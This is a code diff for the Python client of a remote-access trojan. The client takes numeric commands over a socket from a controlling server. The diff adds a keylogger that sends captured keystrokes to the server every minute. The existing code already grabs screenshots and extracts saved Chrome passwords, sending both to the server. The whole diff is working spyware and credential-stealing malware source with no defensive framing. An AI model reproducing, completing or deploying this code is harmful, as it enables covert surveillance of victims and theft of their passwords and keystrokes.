@@ -3,7 +3,7 @@ import signal
 import sys
 import threading, time
 from Queue import Queue
-import passwords
+import passwords, keylog
 import base64
 from PIL import ImageGrab
 
@@ -29,19 +29,19 @@ class Client:
         while True:
             size = self.getSizeOfCommand()
             data = self.s.recv(size)
-            if not data:
-                break
-            if data == "100":
-                print "hello"
-            elif data == "143":
-                threading.Thread(target=self.screenshot).start()
-            elif data == "144":
-                threading.Thread(target=self.passwords).start()
-            elif data == "145":
-                print "last thing"
-            else:
-                print "i don't know that command"
-        self.s.close()
+            if data:
+                if data == "100":
+                    print "hello"
+                elif data == "143":
+                    print "screenshot"
+                    threading.Thread(target=self.screenshot).start()
+                elif data == "144":
+                    threading.Thread(target=self.passwords).start()
+                elif data == "145":
+                    threading.Thread(target=self.keylog).start()
+                else:
+                    print "i don't know that command"
+        # self.s.close()
 
     def getSizeOfCommand(self):
         sizearray = []
@@ -61,17 +61,27 @@ class Client:
     def screenshot(self):
         #TODO: Fill this in
         ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "png")
-        # img = ImageGrab.grab()
         f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
         fread = f.read()
         f.close()
+        state = "143"
         size = str(len(fread))
         data = fread
-        self.enqueue(size,data)
+        self.enqueue(state,size,data)
 
     def keylog(self):
         #TODO: Fill this in
-        return
+        import shutil
+        path = "C:\Users\Matt\Desktop\keylogs.txt"
+        kl = keylog.keyLogger(path)
+        threading.Thread(target=kl.run).start()
+        for i in range(0,1440):
+            time.sleep(60)
+            k = open(path,"rb")
+            state = "145"
+            data = k.read()
+            size = len(data)
+            self.enqueue(state,size,data)
 
     def encrypt(self):
         #TODO: Fill this in
@@ -80,20 +90,23 @@ class Client:
     def passwords(self):
         #TODO: Fill this in
         message = passwords.getChromePasswords()
+        state = "144"
         data = "\n".join(message)
-        self.enqueue(len(data),data)
+        size = len(data)
+        self.enqueue(state,size,data)
 
-    def enqueue(self,size,data):
-        self.messageQ.put((size,data))
+    def enqueue(self,state,size,data):
+        self.messageQ.put((state,size,data))
 
     def dequeue(self):
         while True:
             data = self.messageQ.get()
-            self.sendMessage(data[0],data[1])
+            self.sendMessage(data[0],data[1],data[2])
+            print "sent"
 
-    def sendMessage(self,size,data):
-        self.s.send("!" + str(size) + "!" + data)
-
+    def sendMessage(self,state,size,data):
+        # self.s.sendall("!" + state + "!" + str(size) + "!" + data)
+        self.s.sendall("!" + state + "!" + str(size) + "!" + data)
 
 def main():
     c = Client()
